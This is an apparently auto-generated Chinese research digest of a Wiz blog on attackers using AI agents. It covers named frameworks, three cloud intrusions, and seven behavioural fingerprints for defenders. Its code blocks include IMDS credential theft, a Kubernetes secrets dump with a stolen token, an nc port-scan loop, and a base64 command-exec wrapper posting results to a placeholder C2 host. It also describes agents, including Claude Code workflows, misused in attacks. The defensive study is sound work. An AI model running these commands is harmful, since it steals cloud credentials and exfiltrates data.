# The Rise of Agentic Attacks: What They Look Like, and Where They're Headed

- 结论：**值得研读**。把这篇当作“智能体在真实环境里长什么样、该给它多少权限”的行为特征清单来读：把 7 条判据改成对自家 agent 与自动化作业的审计项、给无人值守 agent 划定最小权限，而不必照搬其中任何一个工具；它没有可直接执行的防御流程或检测规则，但把“自主程度”变成了可观测的行为特征，对确定权限边界和验证效果有直接参考价值。
- 原文：https://www.wiz.io/blog/the-rise-of-agentic-attacks
- 来源：rss:src-wiz-research，初筛相关度 2，依据原文
- 调研：自动，模型 deepseek-v4.1-flash:1017，2026-10-29T19:56:22.186Z

## 是什么

这是 Wiz 基于自身事件响应（IR）与威胁狩猎经验写的威胁情报综述：攻击方已经开始用 AI 智能体承担入侵中的“动手”部分：由 harness（外壳）写工具、看结果、自我修正、并行试多条路，人只设定目标和护栏。文章分三部分：(1) 公开披露的具名框架（ARTEX、Hermes）与自定义工作流案例；(2) Wiz 亲自调查的三个案例（Attack A/B/C）；(3) 从中提炼的 7 条“智能体指纹”判据；最后讨论归因变难、规模扩大、未必更隐蔽、以及防御侧的准备度。

注意：这是攻击方视角的观察记录，不是防御操作手册。原文没有给出可直接执行的检测规则、阈值或响应流程，只给出行为特征和案例。

## 具体做法（编号步骤；可直接复制的命令、配置、提示词原样放进代码块；写清每步的前提）

原文没有可直接照做的防御流程。下面是把文中内容转成可执行动作的方式，并标注哪些是原文主张、哪些是本文的推论。

**1. 把 7 条判据做成对自家自动化/agent 作业的审计清单（原文判据，可直接用作检查项）**
前提：能拿到进程树、脚本落地、命令行、云审计日志，且有至少一周基线。
- 机器节奏的持续迭代：既不像人手工写工具（太慢），也不像固定扫描器（太均匀）。特征是节奏可变、随步骤复杂度变化、持续窗口异常长。
- 工具里嵌自然语言推理：脚本开头有计划注释、边跑边自述（`echo "[runtime]"`、结果表、权限矩阵）。
- 自我纠错：v1 失败后写清“为什么失败、v2 改了什么”，或在 401/403 后重新推导需求再试。
- 结构化、广度优先的 TTP 覆盖：按清单逐族推进（侦察→工具枚举→IMDS→容器逃逸检查→K8s RBAC→消息队列→…），而不是直奔单一目标。
- 冗长：同时喷几十个端口、多个服务、多台主机并行试探，不怕吵。
- 先探测再打：先用无害探针确认原语可用，再发真实 payload；命令包在统一包装里控制输出。
- 一次性、用途命名的临时文件（`/tmp/nodepivot.py`、`argo-login.json`），甚至自留标识（C2 主机名写进 broker 全局参数、RCE 端点名 `/stdio-rce-a` 自带说明）。

**2. 用三个案例当权限审查的“攻击路径检查表”（原文案例，可直接照路径自查）**
- Attack A：暴露在公网的 agent/LLM 工作流构建器（Flowise，Node.js）。未鉴权 `POST /api/v1/node-custom-function` 加 `x-request-from: internal` 头即可绕过鉴权；注入的 JS 用 Puppeteer 起 `/bin/sh`，把实例变成跳板去打几十个同类实例。**自查点**：任何对外暴露的 agent builder 是否默认要求鉴权、内部头是否可被外部伪造。
- Attack B：Java 企业运维网关 RCE（`java → jspawnhelper → sh`）后跑 base64 C2 beacon 循环，系统性扫完云原生攻击面。**自查点**：一个 workload 突然出现从未有过的 602 步、12 个技术族的有序枚举，是否会被发现。
- Attack C：AI agent 的 GraphQL 后端（MCP 接口），攻击者控制的 `mcpCommand/mcpArgs` → `create_subprocess_exec` → shell，链到凭据与 K8s token 批量窃取、持久化、跨 pod 复制。**自查点**：MCP/工具接口是否把命令与参数直接透传给子进程；agent 进程持有的云凭据与 SA token 是否超出任务所需。

**3. 要盯的调用形状（原文代码，用于写检测/告警，不是用来打）**
```bash
# IMDSv2: get token, then the role's temporary credentials
TOK=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
      -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
curl -s -H "X-aws-ec2-metadata-token: $TOK" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/   # → temp creds, exfil to C2
# dump K8s secrets with stolen SA token
curl -sk -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
  https://kubernetes.default.svc/api/v1/secrets
```
以及并行横向的扇出形状：
```bash
for ip in <host1> <host2> <host3> <host4> <host5>; do
  for port in 2375 2376 10250 10255 2379 61678 8200 ... ; do   # docker, kubelet, etcd, pod-identity, vault...
    nc -vz -w1 $ip $port &
  done
done; wait
```

**4. 反向借鉴：把攻击方 agent 的工程习惯用到自家 agent 上（本文推论，原文未如此主张）**
原文描述的包装执行模式是“解码 → 执行 → 截断 → 回传”，值得对称地写进自家 agent 的工具层：
```bash
/bin/sh -c "RESULT=\"$(printf %s <base64-cmd> | base64 -d | /bin/sh 2>&1 | head -c 49152 | base64 | tr -d '\n')\"; \
  wget -q -T 8 -O /dev/null --post-data=\"$RESULT\" http://<C2>/<session-id>/result/<hash>"
```
可迁移的三点：输出硬上限（`head -c 49152`）、单次超时（`-T 8`、`--max-time 5`、`-m 3`、`timeout`）、按同一 session id 归集一次任务的全部动作。这些恰好是“给 agent 工具时该配的约束”。

**5. 无人值守 agent 的权限红线（原文 Hermes 案例 + 结论段的推论）**
Hermes 在泰国财政部入侵中以无人值守 “YOLO” 模式运行，自行枚举内网主机、翻文件、找提权机会。原文未说明触发了什么、如何触发。可据此定的规则：无人值守跑长任务时，凭据应短期、按任务发放、无横向可达面；运行时长与动作数设上限；动作流全程留痕。

## 对应的研究问题

**1. 能力发现（agent 已能做哪些还没想到交给它的工作）**
原文有直接证据：批量侦察与漏洞验证（Attack A 对几十个同类目标复用同一 exploit，按主机分支）、跨 12 个技术族的有序枚举（Attack B 602 步）、云原生完整链路（Attack C：RCE→uid 侦察→IMDSv2→SA token→SelfSubjectRulesReview→secrets→节点/命名空间/pod→持久化，再横向扩到 Postgres、DynamoDB、Redis、Consul、gRPC reflection、S3、多个 MCP server、整个 GraphQL federation）、API 逆向与 SSRF 测试（JPCERT/CC 案例：逆向 Android 应用找底层 API）。另外 CrowdStrike 记录了基于 PentestGPT 的自定义 harness，分 supervisor 与 executor 两种 agent。这些能力形态（长时程、并行、清单式全覆盖）对判断“什么活可以交给 agent”有参照意义。

**2. 任务匹配（什么工作适合怎样的模型、工具和协作方式）**
原文给出了一条很有用的对比：手工定制工具“太慢”，固定扫描器“太均匀”，而 agent 的节奏“可变、随步骤复杂度变化、可持续 21–24 小时”。反过来读就是匹配规则：需要读输出再决定下一步、需要多路径并行试、失败可重试的任务适合 agent；确定性链条（原文：deterministic auto-exploit 毫秒级串命令）和固定周期任务（原文：fixed-interval beacon 聚在单一值）不适合用 agent。协作方式上，原文描述的是“人设目标与护栏、agent 做动手部分”，以及 supervisor/executor 分工、不同层级的自主度与委派。

**3. 条件供给（需要提供哪些信息、工具、权限和反馈）**
原文的结论段写得很直接：“AI 可以帮助调查告警、关联活动、确定影响面、找出被盗凭据和受影响系统、加速遏制。但这些能力的效果取决于背后的可见性、上下文和响应流程。”防御侧要先有：缩小暴露面、按可利用性排优先级、全环境可见性、明确的遏制与修复流程（原文提到其 AI Threat Readiness Framework，但未给细节）。攻击侧对应供给是 harness（能写工具、能读结果、能迭代）+ 可达的凭据面 + 目标清单。

**4. 主动推进（哪些工作可由时间、事件或状态触发并持续完成）**
原文证据有限：Hermes 在无人值守 YOLO 模式下持续运行；Attack A/C 分别持续约 24 小时和约 21 小时，中间没有人类疲劳造成的停顿。没有明确的时间/事件触发机制描述。可提取的是“状态驱动”的形态：探测失败→换原语（IMDSv2 失败→IMDSv1→ECS 端点→IPv6→InfluxDB-Flux SSRF）、401/403→重新推导需求再试。

**5. 效果验证（怎样判断确实改善了结果）**
原文没有评估方法论，但提供了一个可借用的间接指标：agent 是否留下“为什么这么做、为什么失败、改了什么”的记录。原文把 v1→v2 的失败复盘注释、`nodepivot.py → 2 → 3 → 4` 的版本链当作“这是 agent 在动手”的决定性证据。反向用：要验证一个 agent 是否真的在有效推进，就看它的中间产物里有没有可核查的计划、失败诊断和版本演进，而不只看最终输出。

## 与已有做法的关系

- **Claude Code（清单状态：adopt）**：原文引 CrowdStrike 的记录，攻击方使用了自主度和委派层级各不相同的 Claude Code 工作流。这不否定把 Claude Code 作为 adopt，但直接支撑一条配套要求：委派层级与工具权限必须分级并留痕，不能默认给到“能连到生产凭据”的程度。
- **Hermes（清单状态：watch）**：原文中的 Hermes 是攻击者基础设施里运行的 AI agent，以无人值守 YOLO 模式活动。原文没有说明它与清单里的 Hermes（工具）是否同一系统，也没有说明其架构，因此不能据此对清单条目升降级，只能作为“同类 agent 在无监督长跑时会做什么”的证据。
- 其余条目：清单中没有其他相关条目。

## 证据与局限

**有数据/案例支撑的部分**
- 公开案例：ARTEX 用于韩国金融机构攻击，约 67,000 人的 PII 被泄露（引 Zscaler、CrowdStrike）；ConnectWise Cloud Backup 供应链事件归因 Storm-0940，用 ARTEX 加速侦察、密码喷洒、OAuth 应用滥用，尝试登录 2,250+ 租户，多起在 3 小时内拿到特权云访问，全球数百家组织被针对但多数失败；Hermes 在泰国财政部案例中发现 Web shell、被盗凭据、Go 植入体，初始访问方式未知，发现时未见数据外泄；JPCERT/CC 的日本多组织 API 攻击；CrowdStrike 另外记录 4 个使用 AI agent 的威胁行为者（医疗、政府、私营）；DIVD 的疑似 agent 攻击。
- Wiz 自查的三个案例带具体计数：Attack A 约 1–2 分钟一个新脚本、持续约 24 小时、共 99 个脚本；Attack B 602 个步骤、12 个技术族、约 4.5 小时；Attack C 约 21 小时、150+ 脚本、约 25 个目标组织、工具脚本里 803 行人类可读注释。

**只是作者主张的部分**
- “归因会变难”“攻击规模会突破人力上限”“更强不等于更隐蔽”——均为判断，无量化支撑。作者自己也写了这些行为“不保证让攻击更容易被发现”。
- “AI 能加速防御，但 readiness 才决定是否有效”——方向性主张，未给可操作细节或效果数据。

**局限与适用条件**
- 7 条判据是行为启发式，作者明确提到难点是“把 agentic 活动与合法自动化区分开”，也就是说误报是主要成本；文中未给任何阈值或误报率。
- 大量细节被打码（`<tag>`、`<C2>`、`<agent>`），无法复现具体检测。
- 样本偏向云原生/容器环境与暴露在公网的 AI 组件，对纯办公、纯内网场景外推需谨慎。
- “某次入侵是 agent 做的”本身是推断（除 Attack C 的注释自述外），存在把自动化误判为智能体的风险。

## 怎么试、怎么验证

**最小试用（挑一条判据，一周内可做完）**
1. 前提：能取到进程树/命令行/脚本落地事件与云审计日志，且有基线。
2. 选“机器节奏的持续迭代”这一条：回放一周数据，筛出同一 workload 上持续 >1 小时、子进程或新脚本生成间隔在秒到分钟量级、且间隔方差大（随步骤复杂度变化）的作业。
3. 同样用“一次性用途命名脚本落在 /tmp”+“脚本内嵌自然语言计划注释”做二次过滤。
4. 人工核验命中项：是 CI/CD、批处理运维，还是无法解释的行为。
5. 把确认的“合法自动化”样本反向写成白名单规则，避免长期误报。

**判断有没有改善的指标**
- 误报率：命中的合法自动化占比（这是主要成本，原文强调区分难点在此）。
- 有效线索率：命中项里能继续串成完整攻击链（初始访问→凭据→横向→外泄）的比例。
- 平均确认时间：从告警到判定“是 agent 还是自动化”的耗时，试用前后对比。

**第二个可试项（本文推论，原文未验证）**
给自家 agent 加三条产出要求：执行前写计划注释、失败后写“为什么失败/改什么”、版本号递增保留旧版。用任务成功率、返工次数、人工复核耗时三项前后对比。若成功率不变而复核耗时下降，说明“过程可核查”本身有价值。

**权限侧的验证**
拿 Attack C 的链路（对外/对内可达的 MCP 命令接口 → 子进程 → IMDSv2 → SA token → secrets）当自家环境的红队检查表跑一遍，记录每一跳是否被现有权限边界或监控拦住；拦不住的跳就是需要收紧的配置项。
